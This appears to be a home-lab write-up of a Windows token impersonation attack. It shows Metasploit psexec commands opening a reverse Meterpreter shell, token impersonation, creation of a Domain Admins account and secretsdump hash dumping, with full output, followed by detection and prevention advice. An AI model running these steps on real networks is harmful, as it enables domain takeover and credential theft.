# Token Impersonation Attack

**Date:** June 2026 <br> 
**Author:** ShahinSecLab <br> 
**Category:** Privilege Escalation <br> 
**Difficulty:** Easy <br> 
**Tools:** Metasploit Framework, PsExec, Meterpreter, Incognito, secretsdump.py

## Table of Contents

* [Introduction](#introduction)
* [Attack Flow](#attack-flow)
* [Why This Attack Works](#why-this-attack-works)
* [Lab Setup](#lab-setup)
* [Tools Used](#tools-used)
* [Prerequisites](#prerequisites)
* [Step 1 - Getting a Meterpreter Session](#step-1---getting-a-meterpreter-session)
  * [Step 1.1 - Starting Metasploit](#step-11---starting-metasploit)
  * [Step 1.2 - Searching for PsExec](#step-12---searching-for-psexec)
  * [Step 1.3 - Using PsExec Module](#step-13---using-psexec-module)
  * [Step 1.4 - Viewing Module Options](#step-14---viewing-module-options)
  * [Step 1.5 - Setting Required Options](#step-15---setting-required-options)
  * [Step 1.6 - Getting Meterpreter Session](#step-16---getting-meterpreter-session)
* [Step 2 - Checking UID](#step-2---checking-uid)
* [Step 3 - Loading Incognito](#step-3---loading-incognito)
* [Step 4 - Listing Available Tokens](#step-4---listing-available-tokens)
* [Step 5 - Impersonating the Administrator Token](#step-5---impersonating-the-administrator-token)
* [Step 6 - Verifying Access](#step-6---verifying-access)
* [Step 7 - Adding New User](#step-7---adding-new-user)
  * [Step 7.1 - Creating a Domain User](#step-71---creating-a-domain-user)
  * [Step 7.2 - Adding a User to the Domain Admins Group](#step-72---adding-a-user-to-the-domain-admins-group)
* [Step 8 - Dumping All Hashes](#step-8---dumping-all-hashes)
* [How Defenders Can Catch This](#how-defenders-can-catch-this)
* [How to Prevent It](#how-to-prevent-it)
* [References](#references)
* [Lessons Learned](#lessons-learned)

## Introduction

In this lab, I practiced a Windows Token Impersonation attack.

Windows creates an access token whenever a user logs into the system. This token contains information about the user's identity, permissions, and privileges. Windows uses this token to decide what actions a user is allowed to perform.

If a privileged user's token is available on a compromised machine, it may be possible to impersonate that token and perform actions with that user's privileges without knowing the password.

The goal of this lab was to obtain a Meterpreter session, find available tokens, impersonate a privileged account token, and verify the level of access gained.

## Attack Flow
```
Valid Domain Credentials  
              ↓  
Use Metasploit PsExec Module  
              ↓  
Authenticate to the Target via SMB  
              ↓  
Gain a Meterpreter Session (NT AUTHORITY\SYSTEM)  
              ↓  
Load Incognito Extension  
              ↓  
Enumerate Available Access Tokens  
              ↓  
Impersonate the Administrator Token  
              ↓  
Verify Administrator Privileges (`getuid`)  
              ↓  
Open a System Shell  
              ↓  
Create a New Domain User  
              ↓  
Add the User to the Domain Admins Group  
              ↓  
Authenticate as the New Domain Admin  
              ↓  
Dump NTDS Hashes with `secretsdump.py`  
              ↓  
Complete Domain Compromise
```
## Why This Attack Works

Windows uses access tokens to decide what a user can and cannot do on a system. When a user logs in, Windows creates an access token that contains information about the user's identity, permissions, and privileges.

This attack works because Windows allows users and processes to use existing access tokens during normal operations. If a privileged user's token is available in the current session, it may be possible to use that token and act as that user.

In this lab, the Administrator account token was available because the Administrator user had an active session on the target machine. By impersonating that token, I was able to run commands with Administrator privileges.

After gaining Administrator access, I was able to create a new domain user, add the user to the Domain Admins group, and access sensitive information from the domain controller.

This attack is possible when:
- A privileged user has an active session on the machine.
- Token impersonation privileges are available.
- Privileged accounts are not properly protected.

To reduce the risk, organizations should limit the use of privileged accounts, avoid unnecessary administrator sessions, and monitor unusual account activity.

## Lab Setup

| Machine             | Role              |   Ip          |
| ------------------- | ----------------- |---------------|
| Kali Linux          | Attacker          | `192.168.5.128` |
| Windows 10          | Victim            | `192.168.5.142` |
| Windows Server 2019 | Domain Controller | `192.168.5.134` |

## Tools Used

| Tool | Purpose |
| ---- | ------- |
| Metasploit Framework | Used to create a Meterpreter session through PsExec |
| PsExec Module | Used to authenticate to the Windows machine using valid credentials |
| Meterpreter | Used to interact with the compromised Windows system |
| Incognito | Used to list and impersonate available access tokens |
| `secretsdump.py` | Used to dump domain hashes from the Domain Controller |

## Prerequisites

| What | Why |
|-------------------------------|----------------------------------------------|
| Kali Linux machine | Attacker machine with penetration testing tools installed |
| Windows domain environment | Required for testing Active Directory token impersonation |
| Target Windows machine | System where the Meterpreter session is obtained |
| Domain Controller | Required for managing domain users and testing domain access |
| Valid domain credentials | Required to authenticate to the target system |
| Network connectivity | Required for communication between Kali Linux, Windows machine, and Domain Controller |
| Authorization to test the environment | Ensures the assessment is performed legally |

Before starting the attack, I already had valid domain credentials:

| What | Value |
|------|----------------|
| Domain | `readteambd.local` |
| Username | `rahimkhan` |
| Password | `Password1` |


## Step 1 - Getting a Meterpreter Session

### Step 1.1 - Starting Metasploit

First, I started the Metasploit Framework in quiet mode.

```bash
msfconsole -q
```

**Breakdown:**

| Part | Description |
|----------------|-------------|
| `msfconsole` | Starts the Metasploit Framework console |
| `-q` | Starts Metasploit in quiet mode |
| Quiet mode | Hides the startup banner and extra messages, giving a cleaner terminal output |

**Output:**

```text
msf6 >
```
<p align="center">
  <img src="/Active-Directory/05-token impersonation attack/images/step1 1.1.png" width="600">
</p>

The quiet mode does not change how Metasploit works. It only reduces the amount of information displayed when the console starts.

### Step 1.2 - Searching for PsExec

Next, I searched for the available PsExec modules.

```bash
search psexec
```
The output shows several modules related to PsExec. For this lab, I used `exploit/windows/smb/psexec.`

**Output:**

```
Matching Modules
================

   #   Name                                         Disclosure Date  Rank       Check  Description
   -   ----                                         ---------------  ----       -----  -----------
   0   auxiliary/scanner/smb/impacket/dcomexec      2018-03-19       normal     No     DCOM Exec
   1   exploit/windows/smb/smb_relay                2001-03-31       excellent  Yes    MS08-068 Microsoft Windows SMB Relay Code Execution
   2     \_ action: CREATE_SMB_SESSION              .                .          .      Do not close the SMB connection after relaying, and instead create an SMB session
   3     \_ action: PSEXEC                          .                .          .      Use the SMB Connection to run the exploit/windows/psexec module against the relay target
   4     \_ target: Automatic                       .                .          .      .
   5     \_ target: PowerShell                      .                .          .      .
   6     \_ target: Native upload                   .                .          .      .
   7     \_ target: MOF upload                      .                .          .      .
   8     \_ target: Command                         .                .          .      .
   9   exploit/windows/smb/ms17_010_psexec          2017-03-14       normal     Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   10    \_ target: Automatic                       .                .          .      .
   11    \_ target: PowerShell                      .                .          .      .
   12    \_ target: Native upload                   .                .          .      .
   13    \_ target: MOF upload                      .                .          .      .
   14    \_ AKA: ETERNALSYNERGY                     .                .          .      .
   15    \_ AKA: ETERNALROMANCE                     .                .          .      .
   16    \_ AKA: ETERNALCHAMPION                    .                .          .      .
   17    \_ AKA: ETERNALBLUE                        .                .          .      .
   18  auxiliary/admin/smb/ms17_010_command         2017-03-14       normal     No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   19    \_ AKA: ETERNALSYNERGY                     .                .          .      .
   20    \_ AKA: ETERNALROMANCE                     .                .          .      .
   21    \_ AKA: ETERNALCHAMPION                    .                .          .      .
   22    \_ AKA: ETERNALBLUE                        .                .          .      .
   23  auxiliary/scanner/smb/psexec_loggedin_users  .                normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
   24  exploit/windows/smb/psexec                   1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
   25    \_ target: Automatic                       .                .          .      .
   26    \_ target: PowerShell                      .                .          .      .
   27    \_ target: Native upload                   .                .          .      .
   28    \_ target: MOF upload                      .                .          .      .
   29    \_ target: Command                         .                .          .      .
   30  auxiliary/admin/smb/psexec_ntdsgrab          .                normal     No     PsExec NTDS.dit And SYSTEM Hive Download Utility
   31  exploit/windows/local/current_user_psexec    1999-01-01       excellent  No     PsExec via Current User Token
   32  encoder/x86/service                          .                manual     No     Register Service
   33  auxiliary/scanner/smb/impacket/wmiexec       2018-03-19       normal     No     WMI Exec
   34  exploit/windows/smb/webexec                  2018-10-24       manual     No     WebExec Authenticated User Code Execution
   35    \_ target: Automatic                       .                .          .      .
   36    \_ target: Native upload                   .                .          .      .
   37  exploit/windows/local/wmi                    1999-01-01       excellent  No     Windows Management Instrumentation (WMI) Remote Command Execution
   ```

<p align="center">
  <img src="/Active-Directory/05-token impersonation attack/images/step1 1.2.png" width="600">
</p>

### Step 1.3 - Using PsExec Module

I selected the exploit/windows/smb/psexec module to get a Meterpreter session on the target machine.

```bash
use exploit/windows/smb/psexec
```

**Output:**

```text
msf > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp                                                                                      
[*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST                                                                                                       
msf exploit(windows/smb/psexec) >    
```

<p align="center">
  <img src="/Active-Directory/05-token impersonation attack/images/step1 1.3.png" width="600">
</p>

This module uses valid Windows credentials to execute a payload over SMB and open a Meterpreter session on the target.

### Step 1.4 - Viewing Module Options

Next, I checked the module options to see which settings needed to be configured.

```bash
msf exploit(windows/smb/psexec) > options
```

The `options` command is used to display all available settings for a Metasploit module.

**Output:**

```
msf exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):
   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   SERVICE_DESCRIPTION                    no        Service description to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SMBSHARE                               no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share

   Used when connecting via an existing SESSION:
   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   no        The session to run this module on

   Used when making a new connection via RHOSTS:
   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      no        The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      445              no        The target port (TCP)
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):
   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.5.128    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port

Exploit target:
   Id  Name
   --  ----
   0   Automatic
View the full module info with the info, or info -d command.
```
<p align="center">
  <img src="/Active-Directory/05-token impersonation attack/images/step1 1.4.png" width="600">
</p>

### Step 1.5 - Setting Required Options

Before running the exploit, I set the target machine and login details in Metasploit.

```bash
set RHOSTS 192.168.5.142
set SMBUSER rahimkhan
set SMBPASS Password1
set SMBDomain readteambd.local
```

**What these mean:**

* **RHOSTS** → Target machine IP address
* **SMBUSER** → Username used to log in
* **SMBPASS** → Password or NTLM hash for authentication
* **SMBDomain** → Domain name of the target environment

**Output:**

```text
msf exploit(windows/smb/psexec) > set RHOSTS 192.168.5.142
RHOSTS => 192.168.5.142
msf exploit(windows/smb/psexec) > set Interrupt: use the 'exit' command to quit
msf exploit(windows/smb/psexec) > set RHOSTS 192.168.5.142
RHOSTS => 192.168.5.142
msf exploit(windows/smb/psexec) > set SMBUser rahimkhan
SMBUser => rahimkhan
msf exploit(windows/smb/psexec) > set SMBPass Password1
SMBPass => Password1
msf exploit(windows/smb/psexec) > set SMBDomain readteambd.local
SMBDomain => readteambd.local
msf exploit(windows/smb/psexec) >
```
<p align="center">
  <img src="/Active-Directory/05-token impersonation attack/images/step1 1.5.png" width="600">
</p>

### Step 1.6 - Getting Meterpreter Session

After setting everything, I ran the exploit to get a session on the target machine.

```bash
run
```

**Output:**

```text
msf exploit(windows/smb/psexec) > run
[*] Started reverse TCP handler on 192.168.5.128:4444 
[*] 192.168.5.142:445 - Connecting to the server...
[*] 192.168.5.142:445 - Authenticating to 192.168.5.142:445|readteambd.local as user 'rahimkhan'...
[*] 192.168.5.142:445 - Selecting PowerShell target
[*] 192.168.5.142:445 - Executing the payload...
[+] 192.168.5.142:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (196678 bytes) to 192.168.5.142
[*] Meterpreter session 1 opened (192.168.5.128:4444 -> 192.168.5.142:59364) at 2026-06-01 02:42:04 -0400

meterpreter >
```
After this, I successfully got a Meterpreter session on the target system.

<p align="center">
  <img src="/Active-Directory/05-token impersonation attack/images/step1 1.6.png" width="600">
</p>

## Step 2 - Checking UID

After getting a Meterpreter session on the Windows machine, I checked which user I was running as.

```bash
getuid
```

**Output:**

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```
This shows that I already had SYSTEM-level access on the target machine.

<p align="center">
  <img src="/Active-Directory/05-token impersonation attack/images/step2-1.png" width="600">
</p>

## Step 3 - Loading Incognito

After getting a Meterpreter session on the target machine in my lab, I loaded the Incognito module to work with access tokens.

```bash
load incognito
```

**Output:**

```text
meterpreter > load incognito
Loading extension incognito...Success.
```
This confirms that the Incognito extension was loaded successfully and is ready to use for token listing and impersonation.

## Step 4 - Listing Available Tokens

After loading Incognito, I listed all available user tokens on the system in my lab.

```bash
meterpreter > list_tokens -u
```

**Output:**

```text
meterpreter > list_tokens -u

Delegation Tokens Available
========================================
Font Driver Host\UMFD-0
Font Driver Host\UMFD-1
NT AUTHORITY\LOCAL SERVICE
NT AUTHORITY\NETWORK SERVICE
NT AUTHORITY\SYSTEM
READTEAMBD\Administrator
Window Manager\DWM-1

Impersonation Tokens Available
========================================
No tokens available
```

From the list, I could see multiple delegation tokens, including the Administrator account in the domain.

<p align="center">
  <img src="/Active-Directory/05-token impersonation attack/images/step4.png" width="600">
</p>

## Step 5 - Impersonating the Administrator Token

From the available tokens, I selected the Administrator token and impersonated it in my lab session.

```bash
impersonate_token "READTEAMBD\\Administrator"
```

**Output:**

```text
meterpreter > impersonate_token READTEAMBD\\Administrator
[+] Delegation token available
[+] Successfully impersonated user READTEAMBD\Administrator
```
## Step 6 - Verifying Access

After impersonating the token, I checked the current user again to confirm the change.

```bash
getuid
```

**Output:**

```text
meterpreter > getuid
Server username: READTEAMBD\administrator
```
At this point, the session was running with Administrator-level privileges on the target machine in my lab.

## Step 7 - Adding New User

After getting Administrator access in my lab session, I opened a system shell to run Windows commands.

```bash
shell
```
**Output:**

```text
meterpreter > shell
Process 2236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.2965]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

### Step 7.1 - Creating a Domain User

After opening a system shell in my lab session, I created a new domain user named `test` with the password `@shahin123#!`:

```bash
net user test @shahin123#! /add /domain
```
**Breakdown**

| Part | Description |
|----------------|-------------|
| `net user` | Used to manage user accounts in Windows |
| `test` | The username of the new account |
| `@shahin123#!` | The password assigned to the account |
| `/add` | Creates a new user account |
| `/domain` | Performs the action on the Active Directory domain instead of the local machine |

**Output:**

```
C:\Windows\system32>net user test @shahin123#! /add /domain
net user test @shahin123#! /add /domain
The request will be processed at a domain controller for domain READTEAMBD.local.

The command completed successfully.
```

This confirms that a new domain user was created successfully in my lab environment.

<p align="center">
  <img src="/Active-Directory/05-token impersonation attack/images/step7.1.png" width="600">
</p>

## Step 7.2 - Adding a User to the Domain Admins Group

After creating the user in my lab, I tried to add that user to the `Domain Admins` group.

```bash
net group "Domain Admins" test /ADD /DOMAIN
```
**Breakdown**

| Part | Description |
|----------------|-------------|
| `net` | Windows built-in CLI tool for managing network and domain resources |
| `group` | Specifies that the command is working with a domain-level group |
| `Domain Admins` | The target group name (quotes are required because of the space) |
| `test` | The username being added to the group |
| `/ADD` | Adds the user to the specified group |

**Output:**

```
C:\Windows\system32>net group "Domain Admins" test /ADD /DOMAIN
net group "Domain Admins" test /ADD /DOMAIN
The request will be processed at a domain controller for domain READTEAMBD.local.

The command completed successfully.
```

This confirms the user test was added to the Domain Admins group in my lab environment.

## Step 8 - Dumping All Hashes

After creating the new domain user and adding it to the Domain Admins group in my lab, I used that account to extract NTDS domain hashes from the Domain Controller.

```bash
secretsdump.py readteambd.local/test:'@shahin123#!'@192.168.5.134
```
**Breakdown**

| Part | Description |
|----------------|-------------|
| `secretsdump.py` | Impacket script used to dump password hashes and secrets from a Windows/Active Directory target |
| `readteambd.local` | The target domain name |
| `test` | The username used for authentication |
| `@shahin123#!` | The password of the user account |
| `@192.168.5.134` | The IP address of the Domain Controller |

**Output:**

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction failed: string index out of range
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
READTEAMBD\REDTEAMBD-DC$:aes256-cts-hmac-sha1-96:2373e4edd49e2cd50d82138c018e93b1ee56682285b57252b2a007fc19e9623c
READTEAMBD\REDTEAMBD-DC$:aes128-cts-hmac-sha1-96:20d614ac27a44a1a2aeb2c2866c5bbbb
READTEAMBD\REDTEAMBD-DC$:des-cbc-md5:e93bb615455edafb
READTEAMBD\REDTEAMBD-DC$:aad3b435b51404eeaad3b435b51404ee:5d61398d1bb36494251624d87522d005:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x1489248803a2447a36be0a3277c4bbea31e58dcc
dpapi_userkey:0x658a3345d9bbc292356eab42db8971268701f757
[*] NL$KM 
 0000   52 1A 7A 78 A2 BD A4 13  1C 1E 21 49 11 7B B5 91   R.zx......!I.{..
 0010   41 92 FC 6C BB 7D 4C B8  BC 06 BB EA CD 4D 99 E8   A..l.}L......M..
 0020   45 6F 6F 43 2A 4E E7 8A  C2 DE 7B 6D DC DC E7 02   EooC*N....{m....
 0030   9D 52 60 64 62 65 C1 25  03 88 BD B4 88 C6 E6 C5   .R`dbe.%........
NL$KM:521a7a78a2bda4131c1e2149117bb5914192fc6cbb7d4cb8bc06bbeacd4d99e8456f6f432a4ee78ac2de7b6ddcdce7029d5260646265c1250388bdb488c6e6c5
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f8156b8f557baae7cd069ac724e1959:::
READTEAMBD.local\shahin:1105:aad3b435b51404eeaad3b435b51404ee:bcb3cd5313f9537196a11fdb9fad2ac9:::
READTEAMBD.local\sqlservice:1106:aad3b435b51404eeaad3b435b51404ee:7e449687caaf71367ad41ad9490f926d:::
READTEAMBD.local\rahimkhan:1109:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
READTEAMBD.local\karimkhan:1110:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
test2:1115:aad3b435b51404eeaad3b435b51404ee:26f6b62914c0b90561b76abc3121382d:::
test:1117:aad3b435b51404eeaad3b435b51404ee:26f6b62914c0b90561b76abc3121382d:::
REDTEAMBD-DC$:1000:aad3b435b51404eeaad3b435b51404ee:5d61398d1bb36494251624d87522d005:::
VICTIM-1$:1111:aad3b435b51404eeaad3b435b51404ee:af96b7d9f1e7c7d5a983c634b7db3a92:::
VICTIM-2$:1112:aad3b435b51404eeaad3b435b51404ee:4286814f1a9fcc086127d115a63621c7:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:11229cb90f90de06b490fddf1547b22c9e18e085a60747aca3f3a6e48f402f4c
Administrator:aes128-cts-hmac-sha1-96:b529d2369b3c803fd52fff98c6abc5c4
Administrator:des-cbc-md5:202abffea2a15b86
krbtgt:aes256-cts-hmac-sha1-96:29bd3b3755e50fdec690dce37e2ff12b50b8aef064a18e865a575fe56576bbd4
krbtgt:aes128-cts-hmac-sha1-96:106df1d21a66d2eeae03573c53fe4107
krbtgt:des-cbc-md5:572cd631329bdaf8
READTEAMBD.local\shahin:aes256-cts-hmac-sha1-96:21562f5f21641cf8eaa09e07c728110b0d5d05f152b278aa776569c6dc8784c9
READTEAMBD.local\shahin:aes128-cts-hmac-sha1-96:ede4573cedfd8cdf0e069bd6e87f9fed
READTEAMBD.local\shahin:des-cbc-md5:9b58c483ad37b307
READTEAMBD.local\sqlservice:aes256-cts-hmac-sha1-96:b33f27e24d00d4df49ed7ae0288d148f2db992c2e59c6d5a70d52adb9ba08ad8
READTEAMBD.local\sqlservice:aes128-cts-hmac-sha1-96:71f693c2a57c772f1cab00537701cc19
READTEAMBD.local\sqlservice:des-cbc-md5:bfd9e0d55ea86b1a
READTEAMBD.local\rahimkhan:aes256-cts-hmac-sha1-96:a5c93fa6eb16c9a14c00d724a9ec629c095d72dcdfdaaff9a402888040fc789b
READTEAMBD.local\rahimkhan:aes128-cts-hmac-sha1-96:a13f44b8df15afb92d8daa0dd090d6b7
READTEAMBD.local\rahimkhan:des-cbc-md5:0162750ec70862c4
READTEAMBD.local\karimkhan:aes256-cts-hmac-sha1-96:91c22ad68031881bba444a9b574dbe6910b34b74d17c7b336f571e5ffe378746
READTEAMBD.local\karimkhan:aes128-cts-hmac-sha1-96:9fcf640bc4481a0f54cfe5dd6484c801
READTEAMBD.local\karimkhan:des-cbc-md5:76cd582a29dccece
test2:aes256-cts-hmac-sha1-96:15b0a3fd636086443cb04ff4e9a4f2fce721360af8b4034f4712239641b76bfb
test2:aes128-cts-hmac-sha1-96:a1fd53423759c711cd6b7f81ab596aa3
test2:des-cbc-md5:98461c1f947c978c
test:aes256-cts-hmac-sha1-96:a7309d070aadb025a17b0f126dc627c44486e5278fdb431638879b46b1fed9c7
test:aes128-cts-hmac-sha1-96:c110e4ca65344d639af67fe72b53230e
test:des-cbc-md5:4558c18a5107207a
REDTEAMBD-DC$:aes256-cts-hmac-sha1-96:2373e4edd49e2cd50d82138c018e93b1ee56682285b57252b2a007fc19e9623c
REDTEAMBD-DC$:aes128-cts-hmac-sha1-96:20d614ac27a44a1a2aeb2c2866c5bbbb
REDTEAMBD-DC$:des-cbc-md5:b5a2f2fdabf27ad5
VICTIM-1$:aes256-cts-hmac-sha1-96:309fc79973c1ca1460b3dad9deb74ab87ebdf81ae5c833461084d755efb1695e
VICTIM-1$:aes128-cts-hmac-sha1-96:2cc7c1753f6ab893c73633969b241975
VICTIM-1$:des-cbc-md5:b675ce1083ad4a5e
VICTIM-2$:aes256-cts-hmac-sha1-96:8decb9f00c39233817ca1a32114dd607ed4bec34e22a3efea30e73da529ca487
VICTIM-2$:aes128-cts-hmac-sha1-96:7fc817241159420e47632ca236d71258
VICTIM-2$:des-cbc-md5:7ac1431fd0f20298
```
Finally, I was able to dump all hashes successfully.

<p align="center">
  <img src="/Active-Directory/05-token impersonation attack/images/step8.png" width="600">
</p>

## How Defenders Can Catch This

| Indicator | What to look for |
|-------------------------------|----------------------------------------------|
| Unusual token impersonation activity | Monitor processes using privileged user tokens |
| Suspicious use of privileged accounts | Check for unexpected administrator activity |
| New users added to Domain Admins group | Monitor changes to privileged groups |
| Unexpected account creation | Review newly created domain accounts |
| Suspicious access to Domain Controller | Monitor unusual authentication attempts |
| Meterpreter or remote management activity | Check for unknown remote sessions and tools |

## How to Prevent It

- Follow the principle of least privilege.
- Limit the number of users with administrator access.
- Avoid using privileged accounts on normal user machines.
- Disable unnecessary privileges that allow token impersonation.
- Monitor and review members of the Domain Admins group.
- Enable security monitoring for suspicious account changes.
- Use Credential Guard where possible to protect sensitive credentials.

# References

| Category | Resource | Link |
|-------------------------------|--------------------------------|----------------------------------------------|
| MITRE ATT&CK | Access Token Manipulation (T1134) | https://attack.mitre.org/techniques/T1134/ |
| Microsoft Documentation | Access Tokens Documentation | https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens |
| Microsoft Documentation | Windows Privileges Documentation | https://learn.microsoft.com/en-us/windows/win32/secauthz/privileges |
| Microsoft Documentation | Credential Guard Documentation | https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/ |
| Security Documentation | Security Auditing Overview | https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/security-auditing-overview |
| Tools Documentation | Metasploit Framework | https://www.metasploit.com/ |
| Tools Documentation | Meterpreter Documentation | https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/ |
| Tools Documentation | Impacket Documentation | https://github.com/fortra/impacket |

## Lessons Learned

- Windows uses access tokens to control user permissions and privileges.
- A privileged user's token can be reused if it is available in the current session.
- Token impersonation can allow a lower-level session to perform actions with higher privileges.
- Active sessions of privileged users can increase the risk of token-based attacks.
- Protecting administrator accounts and monitoring privileged activity can help reduce the impact of this attack.

